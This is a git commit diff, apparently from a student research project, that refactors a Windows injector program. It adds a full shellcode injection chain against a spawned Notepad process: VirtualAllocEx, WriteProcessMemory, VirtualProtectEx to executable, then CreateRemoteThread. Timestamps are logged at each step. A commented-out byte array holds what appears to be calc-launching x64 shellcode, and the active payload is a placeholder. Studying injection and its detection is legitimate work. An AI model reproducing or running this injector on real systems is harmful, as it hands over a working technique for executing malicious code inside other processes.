5db89dfa58308bd0d4cd8da9d0b546554b4690b2
cailllev <cailllev@students.zhaw.ch>
2025-08-19 16:24:02 +0200

    refactor injector

--- Injector/inject.cpp
+++ Injector/inject.cpp
@@ -1,14 +1,22 @@
 #include <windows.h>
 #include <iostream>
 #include <iomanip>
-#include <ctime>
+#include <sstream>
 
-// print current timestamp in ISO 8601 format, e.g. 2025-08-18 18:03:51Z
+// print current timestamp in ISO 8601 format, e.g. 2025-08-18 18:03:51.123Z
 void printCurrentTime(std::string prefix) {
-    std::time_t now = std::time(nullptr);
-    std::tm tmUtc{};
-    gmtime_s(&tmUtc, &now);
-    std::cout << prefix << std::put_time(&tmUtc, "%Y-%m-%d %H:%M:%SZ") << "\n";
+    SYSTEMTIME st;
+    GetSystemTime(&st);
+    std::cout << prefix
+        << std::setfill('0')
+        << std::setw(4) << st.wYear << '-'
+        << std::setw(2) << st.wMonth << '-'
+        << std::setw(2) << st.wDay << ' '
+        << std::setw(2) << st.wHour << ':'
+        << std::setw(2) << st.wMinute << ':'
+        << std::setw(2) << st.wSecond << '.'
+        << std::setw(3) << st.wMilliseconds
+		<< "Z\n";
 }
 
 int main(int argc, char** argv) {
@@ -32,7 +40,10 @@ int main(int argc, char** argv) {
         }
     }
 
-    // start calc
+    // print current PID
+	std::cout << "Injector started. PID: " << GetCurrentProcessId() << "\n";
+
+    // start Notepad
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     if (!CreateProcess(L"C:\\Windows\\System32\\notepad.exe", nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
@@ -65,9 +76,11 @@ int main(int argc, char** argv) {
         return 1;
     }
 
+	// byte array of value to write
+    byte shellcode[] = { 0x0, 0xA };// { 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00};
+
     // allocate memory in Notepad
-    int valueToWrite = 0xdeadbeaf;
-    LPVOID remoteAddr = VirtualAllocEx(hProcess, nullptr, sizeof(valueToWrite), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    LPVOID remoteAddr = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (remoteAddr) {
         std::cout << "Memory allocated at address: " << remoteAddr << "\n";
     }
@@ -76,20 +89,23 @@ int main(int argc, char** argv) {
         return 1;
     }
 
-    // read before writing
-    SIZE_T bytesRead;
-    int valueRead = 0;
-    if (ReadProcessMemory(hProcess, remoteAddr, &valueRead, sizeof(valueRead), &bytesRead)) {
-        std::cout << "Value before write: 0x" << std::hex << valueRead << std::dec << "\n";
+	// read process memory information
+	MEMORY_BASIC_INFORMATION mbi;
+    if (VirtualQueryEx(hProcess, remoteAddr, &mbi, sizeof(mbi))) {
+        std::cout << "Memory region at address: " << remoteAddr
+            << " is " << mbi.State << " with protection: " << mbi.Protect << "\n";
     }
     else {
-        std::cerr << "Failed to read memory. Error: " << GetLastError() << "\n";
+        std::cerr << "Failed to query memory: " << GetLastError() << "\n";
+        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
         return 1;
-    }
+	}
+    
 
     // write value into Notepad's memory
     SIZE_T bytesWritten;
-    if (WriteProcessMemory(hProcess, remoteAddr, &valueToWrite, sizeof(valueToWrite), &bytesWritten)) {
+    if (WriteProcessMemory(hProcess, remoteAddr, &shellcode, sizeof(shellcode), &bytesWritten)) {
         std::cout << "Value written to address: " << remoteAddr << "\n";
     }
     else {
@@ -97,15 +113,35 @@ int main(int argc, char** argv) {
         return 1;
     }
 
-    printCurrentTime("Value written at: ");
+    printCurrentTime("Shellcode injected at: ");
 
-    // and read it
-    if (ReadProcessMemory(hProcess, remoteAddr, &valueRead, sizeof(valueRead), &bytesRead)) {
-        std::cout << "Value after write: 0x" << std::hex << valueRead << std::dec << "\n";
+	// change memory protection to executable
+    DWORD oldProtect;
+    if (VirtualProtectEx(hProcess, remoteAddr, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
+        std::cout << "Memory protection changed to executable.\n";
     }
     else {
-        std::cerr << "Failed to read memory. Error: " << GetLastError() << "\n";
+        std::cerr << "Failed to change memory protection: " << GetLastError() << "\n";
+        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return 1;
+	}
+
+    printCurrentTime("RX protection at: ");
+
+	// call create remote thread
+	HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteAddr, nullptr, 0, nullptr);
+    if (hThread) {
+        std::cout << "Remote thread created successfully.\n";
     }
+    else {
+        std::cerr << "Failed to create remote thread: " << GetLastError() << "\n";
+        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return 1;
+	}
+
+    printCurrentTime("Shellcode called at: ");
 
     // cleanup
     VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
